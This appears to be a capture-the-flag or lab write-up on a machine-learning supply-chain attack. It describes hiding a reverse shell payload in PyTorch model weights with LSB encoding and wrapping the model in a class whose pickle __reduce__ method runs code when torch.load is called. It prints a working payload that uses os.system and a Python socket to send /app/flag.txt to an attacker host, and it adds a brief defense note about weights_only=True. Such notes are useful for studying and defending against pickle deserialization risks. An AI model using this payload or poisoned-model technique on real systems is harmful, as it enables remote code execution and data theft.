# Model Steganography and Supply Chain Attack

Hide a reverse shell payload inside model weights using LSB (Least Significant Bit) encoding,
then deliver it via a model upload endpoint to achieve RCE.

## Attack Chain

1. Train a SimpleNet model with a large_layer (64x320 weights = 20480 elements)
2. Encode reverse shell payload into large_layer.weight using LSB encoding (2 bits per float)
3. Wrap poisoned state_dict in TrojanModelWrapper with malicious __reduce__ method
4. Upload malicious .pth file to target server
5. Server calls torch.load() which triggers pickle deserialization and executes payload

## Key Insight

torch.load uses pickle under the hood. Pickle's __reduce__ method executes arbitrary
code during deserialization. Any application loading untrusted model files without
weights_only=True is vulnerable to RCE.

## Payload Approach That Worked

Direct os.system with Python socket exfiltration:

```python
def __reduce__(self):
    cmd = f"python3 -c \"import socket,os; s=socket.socket(); s.connect(('{HOST_IP}',{LISTENER_PORT})); s.send(open('/app/flag.txt','rb').read()); s.close()\""
    return (os.system, (cmd,))
```

## Defense

Always use torch.load(path, weights_only=True) for untrusted model files.
Never load model files from untrusted sources.

## Mac-Specific Notes

- Listener: python3 socket listener instead of ncat (Mac ncat syntax differs)
- Use python3 -m pip for conda environment package installs
